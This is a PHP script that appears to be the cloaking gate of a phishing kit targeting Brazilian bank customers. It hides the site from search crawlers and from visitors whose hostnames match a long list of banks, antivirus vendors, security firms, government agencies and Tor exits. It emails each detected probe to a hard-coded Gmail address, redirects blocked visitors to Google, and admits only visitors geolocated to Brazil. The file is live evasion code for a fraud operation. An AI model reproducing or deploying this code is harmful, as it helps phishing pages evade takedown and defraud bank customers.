<?php
ob_start();
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
	$userAgents = array("Google", "GoogleBot", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "Acunetix", "wwwroot", "crossdomain");
	if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
	header('HTTP/1.0 404 Not Found');
	exit;
	}
}
$uri = $_SERVER["REQUEST_URI"];
$ipserver = $_SERVER["SERVER_ADDR"];
$resuelveserver = gethostbyaddr($ipserver);
$e500 = '<script language="javascript">window.location.replace("https://www.google.com/");</script>';
$ipx = getenv("REMOTE_ADDR");
$host = gethostbyaddr($ipx);
$banhosts = array("bradesco","pish","santander", "scotiabank", "google-bot", "google-proxy", "googleproxy", "netcraft.com",
"ebay.com", "panda.com","microsoft.com", "fbi.gov", "msn.com","yahoo.com", "cia.gov", "bankofamerica", "viabcp", "veritas",
"nod32","antipishing","kapersky", "norton", "symantec","rsasecurity", "bancopopular", "paypal", "unicaja", "movistar", ".spfbl.",
"banesto", "cajamadrid", "bancopastor", "rsa.com", "symantecstore", "gfihispana", "fraudwatchinternational", "verisign", "prcdn",
"markmonitor", "pandasoftware", "delitosinformaticos", "zonealarm", "alerta-antivirus", "vsantivirus", "above", "dreamhost",
"nortonsecurityscan", "hauri-la", "cleandir", "trendmicro", "mcafee", "nod32-es", "pandaantivirus", "free-av", "grisoft", "pool.",
"bitdefender-es", "sophos", "activescan", "avast", "bitdefender", "trendmicro-europe", "clamav", "clamwin", "eset", "google",
"symantecstore", "f-secure", "hispasec", "vnunet", "seguridad", "security", "monitor", "detector", "letti", "itau", "189.9.20.",
"santander", "dufrio", "mx.", "bb.com.br", "phish", "amazon", "cloud", "scaleway", "reverse", ".tor.", "tor-exit", "linode", "dimenoc");

$x = count($banhosts);


//email que irá receber alerta de acessos suspeitos dos hosts acima
$m = "kvneutrino@gmail.com";

for ($y = 0; $y < $x; $y++) {
   if (strpos($host ,$banhosts[$y])== true) {
	@mail($m, $banhosts[$y],$ipx . ' - ' . $host . ' - ' . $uri);
	echo $e500;
	exit;
   } 
}

$bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^189.9.20.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
	@mail($m, $ipx,$host . ' - ' . $uri);
	echo $e500;
	exit;
}

$data = date("d-M-Y-H-i-s");
$ip = $_SERVER['REMOTE_ADDR'];
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
if($query && $query['status'] == 'success') {
  $pais = $query['country'];
}
if ($pais != 'Brazil') {
	header("HTTP/1.1 500 Internal Server Error");
	echo $e500; 
	exit();
}
?>